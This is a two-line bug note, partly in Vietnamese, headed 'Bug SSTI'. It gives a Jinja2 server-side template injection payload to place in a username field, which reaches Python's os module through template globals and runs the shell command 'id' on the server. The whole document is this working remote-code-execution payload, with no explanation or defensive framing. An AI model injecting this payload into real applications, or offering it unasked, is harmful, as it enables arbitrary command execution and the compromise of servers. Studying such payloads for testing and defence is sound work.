# Bug SSTI
payload vào username: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}